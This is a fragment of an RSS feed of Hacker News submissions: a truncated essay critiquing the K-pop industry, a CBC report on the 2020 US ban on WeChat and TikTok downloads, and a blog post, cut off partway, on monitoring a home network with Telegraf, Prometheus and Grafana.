<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</a></em></p>]]>
            </description>
            <link>https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525210</guid>
            <pubDate>Sat, 19 Sep 2020 04:56:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Deep Dive into K-pop]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525108">thread link</a>) | @eswat
<br/>
September 18, 2020 | https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/ | <a href="https://web.archive.org/web/*/https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-719">

	
	<!-- .entry-header -->


			<div>

			<p><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8dedad4c-ee57-46fd-91a2-32cbb9a652d1/d97l7vh-b56d2b05-419a-4aa2-90c9-1f7a87db1968.jpg/v1/fill/w_1024,h_725,q_75,strp/my_first_kpop_collage_by_rainbowcandleofjoy_d97l7vh-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzI1IiwicGF0aCI6IlwvZlwvOGRlZGFkNGMtZWU1Ny00NmZkLTkxYTItMzJjYmI5YTY1MmQxXC9kOTdsN3ZoLWI1NmQyYjA1LTQxOWEtNGFhMi05MGM5LTFmN2E4N2RiMTk2OC5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.Py2kzajyzSvCd5CFWXNFSOW5m_rgR6UJMXllQj3dy18" alt="KPOP Collections: Kpop Groups Collage"></p>
<p>Prior to last month, I knew next to nothing about K-pop (Korean popular music) besides having heard a few songs in passing and the rumors of the industry‚Äôs infamous elements, most notably a string of high profile suicides over the last few years. As an American with no connection to music or South Korean culture, I wondered if I was getting an accurate picture of the industry or if I was being misled by the most lurid and morbid elements eagerly conveyed by the media.</p>
<p>So I decided to do a deep dive down the internet rabbit hole of K-pop to understand what it is, how it works, and what I think about it. For anything that‚Äôs not my personal opinion or that goes beyond basic historical knowledge, I‚Äôll cite my sources, which are a mixture of news articles, academic articles, YouTube videos, and some content aggregators like Wikipedia and Statista. I welcome any corrections or criticisms on inaccurate sources or things I didn‚Äôt understand.</p>
<p>I‚Äôll warn you upfront ‚Äì this essay is over 30,000 words long. It is the largest post I have made on dormin.org besides my novel. Since I sympathize with anyone who doesn‚Äôt want to make such a large time investment into a subject of passing curiosity, I will present my key findings here divided between the five <strong>parts</strong> of the essay. If you‚Äôre not sure if you want to read everything, you can jump to any individual part and understand it without reading the other sections.</p>

<h3><a href="#Basics"><strong><u>Part 1</u> ‚Äì <u>The Basics</u></strong></a></h3>
<ul>
<li>‚ÄúK-pop‚Äù is both a genre of music and an entire industry which ‚Äúmanufacturers‚Äù performers and their performance output (music, dance routines, shows, merchandise, etc.) in a highly systematized top-down manner</li>
<li>The global popularity of K-pop is extraordinary considering the relatively small population of South Korea, and the relatively small size of K-pop production companies</li>
</ul>
<h3><a href="#Product"><strong><u>Part 2</u> ‚Äì <u>The Product</u></strong></a></h3>
<ul>
<li>K-pop‚Äôs industrial/corporate structure represents a Korean (and East-Asian) cultural alternative to Western pop and broader music production</li>
<li>K-pop stars and bands are manufactured and controlled by production companies in the same manner Western athletes are trained and traded by sports teams.</li>
<li>K-pop stars are crafted into idealized portrays of individuals by East Asian cultural standards</li>
</ul>
<h3><a href="#Fans"><strong><u>Part 3</u> ‚Äì <u>The Fans</u></strong></a></h3>
<ul>
<li>K-pop fandom is both more intense on average than Western fandom, and has a larger percentage of unhealthily obsessive fans</li>
<li>K-pop fandom is based on a parasocial relationship between fans and stars</li>
<li>K-pop stars are forced to abide by extremely restrictive behavioral norms to appease production companies and fans</li>
</ul>
<h3><a href="#Process"><strong><u>Part 4</u>‚Äì <u>The Process</u></strong></a></h3>
<ul>
<li>Trying to become a K-pop star is a terrible idea by any rational cost-benefit analysis</li>
<li>The process by which production companies train K-pop stars is abusive and depends on the ignorance of children/teenagers and clueless and/or malicious parents</li>
<li>Even after making it through the extraordinarily difficult audition and training process, the vast majority of K-pop stars will have short careers and earn little or possibly <em>no</em> money</li>
</ul>
<h3><a href="#Machine"><strong><u>Part 5</u> ‚Äì <u>The Machine</u></strong></a></h3>
<ul>
<li>K-pop is an extremely centralized, hierarchical industry, where structural, business, and creative decisions are almost entirely made by corporate management, rather than the performers</li>
<li>Raw creativity in the music production process is largely outsourced to Westerners who write, produce, and choreograph the music</li>
<li>The K-pop industry is subsidized and supported by the South Korean government, if not implicitly or explicitly directed, as a conscious form of soft power projection and social control.</li>
</ul>
<p>As you can tell, I came away from my research with a negative view of K-pop. I don‚Äôt think it‚Äôs the worst thing in the world, but I find its fandom to be unhealthy and its production process to be exploitative. That being said, there are undoubtedly many tremendous talents in the K-pop world and the cultural power of K-pop is remarkable. I‚Äôll give my summarized thoughts on K-pop as a whole at the conclusion of the essay.<br>
<a name="Basics"></a></p>
<hr>
<p><img src="https://www.rollingstone.com/wp-content/uploads/2018/08/BTS-kpop-takeover-the-world.jpg" alt="How K-Pop Conquered the West - Rolling Stone"></p>
<h2><strong><u>Part 1</u> ‚Äì <u>The Basics</u></strong></h2>
<h3><strong>What is K-pop?</strong></h3>
<p>‚ÄúK-pop‚Äù refers to a genre of music and the industry which creates it. Both are based out of South Korea and particularly Seoul.</p>
<h3><strong>What is K-pop music?</strong></h3>
<p>K-pop is an offshoot of 90s Western pop with heavy influences from synthetics and hip hop. Lyrics are mostly Korean, but with English words and sometimes other languages thrown in. K-pop is usually sung by mono-gendered bands with members aged from their mid-teens to late 20s. Such bands typically resemble the structure and appearance of American boy bands from the 90s and 2000s (ie. NSYNC). As a representative K-pop sample, check out ‚ÄúDNA‚Äù by BTS:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/MBdVXkSdhwU?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Properly understood, ‚ÄúK-pop music‚Äù is inseparable from ‚ÄúK-pop performance.‚Äù The music itself is one component of a larger presentation which includes dance choreography, music videos, fashion, and the personas of bands and individual band members. Though these elements are also present in Western music, they are far more important to K-pop music. K-pop fandom is considered the appreciation of all these aspects as an integrated whole.</p>
<h3><strong>What are the Origins of K-pop?</strong></h3>
<p>The Western influence on Korean music began in the 1940s with the American occupation of much of the Korean peninsula after its liberation from Imperial Japan. With the outbreak of the Korean War in the early 1950s, further American presence was added, with over 300,000 US troops at the peak.<a href="#_edn1" name="_ednref1">[1]</a> After the war, the American military stayed at dozens<a href="#_edn2" name="_ednref2">[2]</a> of bases throughout South Korea as a permanent fixture of the country. Over the decades, these soldiers imported American culture and media, including American music. Presently, there are still 20,000 US soldiers in South Korea.<a href="#_edn3" name="_ednref3">[3]</a></p>
<p>The early Western musical influence in South Korea was based on folk and hippie music in the 60s and 70s, and then evolved into sappy ballads in the 80s. These genres merged with traditional Korean music to form a small, localized music industry. Creative expansion was restrained by the South Korean government‚Äôs censorship and restrictions on movement in and out of the country. In the 1970s, the government banned American rock music and Korean offshoots for their connotations with drug use.<a href="#_edn4" name="_ednref4">[4]</a> Until 1983, South Korean citizens were banned from traveling abroad for tourism, and the last restrictions weren‚Äôt lifted until 1988 (year of the Seoul Summer Olympics).<a href="#_edn5" name="_ednref5">[5]</a></p>
<p>Korean music had a revolution in the early 1990s with the three-member band, Seo Taiji and the Boys. Founded in 1992, the Boys debuted on a South Korean television talent show and received the lowest ratings of the night.<a href="#_edn6" name="_ednref6">[6]</a> Unexpectedly, their premiere song was a huge hit and launched the band to fame. The Boys soon became the first successful Korean rap group and redefined the Korean music industry. Leader Seo Taiji was a rare experimenter in a country still emerging from isolation and relative cultural stagnancy. Prior to forming the Boys, he had been part of an indie heavy metal band.<a href="#_edn7" name="_ednref7">[7]</a></p>
<p>Through their music, style, and appearance, Seo Taiji and the Boys inadvertently became the first K-Pop band. While their music was more hip hop-based, the Boys pioneered the mixture of Western pop and hip hop presented with intense, highly-choreographed dance routines within a refined aesthetic theme.<a href="#_edn8" name="_ednref8">[8]</a> For a sample, see here:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/IRFfPZQeJuo?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Seo Taiji and the Boys disbanded in 1996. But by the end of its short career, mimicking boy bands had sprung up throughout South Korea. These bands were picked up by a new wave of music production companies which would become the basis of the K-pop industry. They looked to Japan and its well established ‚ÄúJ-pop‚Äù industry as a template for the sustained production of popular musical talent. Thus, while the Boys were independent, experimental, and subversive, the bands created in their wake were more institutionalized, sanitized, and formed by top-down design.</p>
<h3><strong>How Big is K-pop?</strong></h3>
<p>In 2017, the entire K-pop industry produced $5 billion in revenue.<a href="#_edn9" name="_ednref9">[9]</a> For the closest American comparison I can find ‚Äì in 2019, American <em>record labels</em> earned $8.7 billion in revenue.<a href="#_edn10" name="_ednref10">[10]</a> Unfortunately, I can‚Äôt find numbers for total music industry revenue in the US, so this isn‚Äôt quite a fair comparison. The two might be difficult to compare due to diverging industry structures;&nbsp; for instance, in South Korea, $1.2 billion of its 2017 revenues came from karaoke sales, only $250 million less than its digital music sales<a href="#_edn11" name="_ednref11">[11]</a></p>
<p>Nevertheless, considering that South Korea has less than 1/6<sup>th</sup> the US population and 1/14<sup>th</sup> the GDP, that‚Äôs pretty damn impressive.</p>
<p>Also of note, in 2019, South Korea was the 6<sup>th</sup> largest music market in the world, ahead of China and behind France.<a href="#_edn12" name="_ednref12">[12]</a> In 2017, South Korea exported $513 million worth of music and imported only $14 million worth, which is an extremely strong indicator of the country‚Äôs preference for K-pop over Western pop.<a href="#_edn13" name="_ednref13">[13]</a></p>
<p>BTS (AKA Bangtan Boys) is the most popular K-pop band in the world today and ever. According to the 2019 IFPI Global Music Report, BTS was the 7<sup>th</sup> most listened to artist in the world, and had the 3<sup>rd</sup> most popular album globally. Despite Spotify not streaming in South Korea, BTS was its second most popular artist in 2019.<a href="#_edn14" name="_ednref14">[14]</a></p>
<p>Perhaps more relevantly, a 2017 Hyundai Research Institute report claimed that BTS alone was worth $3.6 billion to the South Korean economy annually when accounting for adjacent economic activity and tourism. Supposedly 1/13th of all tourists to South Korea in 2017 came because of BTS.<a href="#_edn15" name="_ednref15">[15]</a> A 2019 report from Hollywood Reporter brought the figure up $4.65 billion.<a href="#_edn16" name="_ednref16">[16]</a></p>
<h3><strong>How Big is K-pop in America?</strong></h3>
<p>I can‚Äôt find firm figures, but the general consensus is that K-pop has been blowing up in the US since at least 2017, with articles about the genre‚Äôs American explosion popping up in the <em>New York Times</em>,<a href="#_edn17" name="_ednref17">[17]</a> <em>NPR</em>,<a href="#_edn18" name="_ednref18">[18]</a> the <em>Guardian</em>,<a href="#_edn19" name="_ednref19"><em><strong>[19]</strong></em></a> etc. From 2015 to 2019, demand for K-pop concert tickets increased 1,900% in the US.<a href="#_edn20" name="_ednref20">[20]</a> This growth seems to be largely thanks to BTS, which is about 5X more popular than Blackpink, the second most popular ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</a></em></p>]]>
            </description>
            <link>https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525108</guid>
            <pubDate>Sat, 19 Sep 2020 04:36:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 180 (<a href="https://news.ycombinator.com/item?id=24524662">thread link</a>) | @empressplay
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524662</guid>
            <pubDate>Sat, 19 Sep 2020 03:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monitoring My Home Network]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24524433">thread link</a>) | @mr-karan
<br/>
September 18, 2020 | https://mrkaran.dev/posts/isp-monitoring/ | <a href="https://web.archive.org/web/*/https://mrkaran.dev/posts/isp-monitoring/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p>I like monitoring <em>stuff</em>. That‚Äôs what I do at work and when my home ISP started giving me random problems and I decided it would be nice to monitor my home network as well. There are a couple of ways to go around this, a very popular and OSS solution is <a href="https://oss.oetiker.ch/smokeping/">SmokePing</a>. SmokePing is written in Perl and is used to visualise network latencies. It‚Äôs quite a great solution but for my current stack which involves Prometheus and Grafana, it meant I had to deploy a standalone tool separate from my monitoring stack - something which I wanted to avoid.</p>

<p><img src="https://oss.oetiker.ch/smokeping/doc/reading_detail.png" alt="SmokePing Graphs"></p>

<p>So, I looked for other solutions and luckily happened to stumble upon <a href="https://twitter.com/oddtazz">oddtazz</a> in one of the common Telegram groups where he shared his solution for the above: Telegraf ICMP <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/ping">plugin</a> and Grafana. This is exactly what I‚Äôve been looking for but for some reason, I had wrongly assumed Telegraf needs InfluxDB to store the data. Googling a bit more, I found Telegraf <a href="https://github.com/influxdata/telegraf/blob/release-1.15/plugins/outputs/prometheus_client/README.md">supports</a> Prometheus format (amongst a huge list of others!) but this wasn‚Äôt so clear in their docs.</p>

<p>I decided to run a Telegraf agent in my RPi connected to my home router over LAN and scrape metrics using Prometheus and visualise graphs in Grafana! For the non-patient readers, here‚Äôs what my dashboard looks like!:</p>

<p><img src="https://mrkaran.dev/images/ISP-Monitoring-Grafana2.png" alt="image"></p>

<p><img src="https://mrkaran.dev/images/ISP-Monitoring-Grafana1.png" alt="image"></p>

<h2 id="setup">Setup</h2>

<p>To get started, we need to download <a href="https://github.com/influxdata/telegraf">Telegraf</a> and configure the <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/ping">Ping</a> plugin. Telegraf has the concept of <strong>Plugins</strong> for Input, Output, Aggregating and Processing. What this basically means is that you can configure multiple input plugins like DNS, ICMP, HTTP and export the data of these plugins in a format of your choice with Output plugins.
This makes Telegraf extermely extensible, you could write a plugin (in Go) of your choice if you fancy that as well!</p>

<p>Here‚Äôs what my <code>telegraf.conf</code> looks like:</p>
<div><pre><code data-lang="toml"><span># Input plugins</span>

<span># Ping plugin</span>
[[<span>inputs</span>.<span>ping</span>]]
<span>urls</span> = [<span>"mrkaran.dev"</span>, <span>"tailscale.mrkaran.dev"</span>, <span>"floyd.mrkaran.dev"</span>, <span>"1.1.1.1"</span>, <span>"kite.zerodha.com"</span>, <span>"google.com"</span>, <span>"reddit.com"</span>, <span>"twitter.com"</span>, <span>"amazon.in"</span>, <span>"zerodha.com"</span>]
<span>count</span> = <span>4</span>
<span>ping_interval</span> = <span>1.0</span>
<span>timeout</span> = <span>2.0</span>

<span># DNS plugin</span>
[[<span>inputs</span>.<span>dns_query</span>]]
  <span>servers</span> = [<span>"100.101.134.59"</span>]
  <span>domains</span> = [<span>"mrkaran.dev"</span>, <span>"tailscale.mrkaran.dev"</span>, <span>"floyd.mrkaran.dev"</span>, <span>"1.1.1.1"</span>, <span>"kite.zerodha.com"</span>, <span>"google.com"</span>, <span>"reddit.com"</span>, <span>"twitter.com"</span>, <span>"amazon.in"</span>, <span>"zerodha.com"</span>]

<span># Output format plugins</span>
[[<span>outputs</span>.<span>prometheus_client</span>]]
  <span>listen</span> = <span>":9283"</span>
  <span>metric_version</span> = <span>2</span></code></pre></div>
<p>Firstly, so nice to see an <em>Ops</em> tool <strong>not</strong> using <code>YAML</code>. Kudos to Telegraf for that. I‚Äôd love to see other tools follow suit.</p>

<p>Getting back to the configuration part, <code>input.plugin</code> is a list of plugins that can be configured and I have configured the Ping and DNS plugin in my config. The <code>output</code> is in Prometheus format so it can be scraped and ingested by Prometheus‚Äô time-series DB.</p>

<h3 id="running-telegraf">Running Telegraf</h3>

<p>With the above config in place, let‚Äôs try running the agent and see what metrics we get. I am using <a href="https://hub.docker.com/_/telegraf/">official</a> Docker image to run the agent with the following config:</p>
<div><pre><code data-lang="sh">docker run --name telegraf-agent --restart always -d -p <span>9283</span>:9283 -v <span>$PWD</span>/telegraf.conf:/etc/telegraf/telegraf.conf:ro telegraf</code></pre></div>
<p>After running the above command, you should be able to see the metrics at <code>localhost:9283/metrics</code></p>
<div><pre><code data-lang="sh">$ curl localhost:9283/metrics | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  <span>0</span>     <span>0</span>    <span>0</span>     <span>0</span>    <span>0</span>     <span>0</span>      <span>0</span>      <span>0</span> --:--:-- --:--:-- --:--:--     <span>0</span><span># HELP dns_query_query_time_ms Telegraf collected metric</span>
<span># TYPE dns_query_query_time_ms untyped</span>
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"amazon.in"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>124</span>.096472
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"google.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>136</span>.793673
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"kite.zerodha.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>122</span>.780946
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"mrkaran.dev"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>137</span>.915851
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"twitter.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>111</span>.097483</code></pre></div>
<p>Perfect! Now, we‚Äôre all set to configure Prometheus to scrape the metrics from this target. In order to do that you need to add a new <a href="https://prometheus.io/docs/concepts/jobs_instances/">Job</a>:</p>
<div><pre><code data-lang="yml">- job_name: <span>"ispmonitor"</span>
  scrape_interval: 60s
  static_configs:
    - targets: [<span>"100.94.241.54:9283"</span>] <span># RPi telegraf Agent</span></code></pre></div>
<p>In the above config, I am plugging my Tailscale IP assigned to my RPi on the port where Telegraf agent is bound to. This is one of the <strong>many</strong> reasons why Tailscale is so bloody awesome! I can connect different components in my network to each other without setting up any particular firewall rules, exposing ports on a case by case basis.</p>

<p><strong>Sidenote</strong>: If you haven‚Äôt read Tailscale‚Äôs <strong>amazing</strong> <a href="https://tailscale.com/blog/how-nat-traversal-works/">NAT Traversal blog post</a>, do yourself a favour and check it out after you finish reading this one ofcourse!</p>

<p>Anyway, coming back to our Prometheus setup, we can see the metrics being ingested:</p>

<p><img src="https://mrkaran.dev/images/Prometheus-Telegraf-Ingest.png" alt="image"></p>

<h2 id="show-me-the-graphs">Show me the graphs</h2>

<p>Now comes the exciting bit ‚Äì making <strong>pretty</strong> graphs. First, let‚Äôs discuss what‚Äôs the most important data I can extract out of <code>Ping</code> and <code>DNS</code> plugins. These plugins export decent amount of data, but a good rule of thumb while making dashboards is to optimise signal v/s noise ratio. We‚Äôll do that by filtering out only the metrics that we care for.</p>

<p>Let‚Äôs checkout all the metrics exported by <code>Ping</code> plugin:</p>
<div><pre><code data-lang="sh">$ curl localhost:9283/metrics | grep ping | grep TYPE
<span># TYPE ping_average_response_ms untyped</span>
<span># TYPE ping_maximum_response_ms untyped</span>
<span># TYPE ping_minimum_response_ms untyped</span>
<span># TYPE ping_packets_received untyped</span>
<span># TYPE ping_packets_transmitted untyped</span>
<span># TYPE ping_percent_packet_loss untyped</span>
<span># TYPE ping_result_code untyped</span>
<span># TYPE ping_standard_deviation_ms untyped</span>
<span># TYPE ping_ttl untyped</span></code></pre></div>
<p>Perfect! So, from the above list of metrics, the most important ones for us are:</p>

<ul>
<li><code>ping_average_response_ms</code>: Avg RTT for a packet</li>
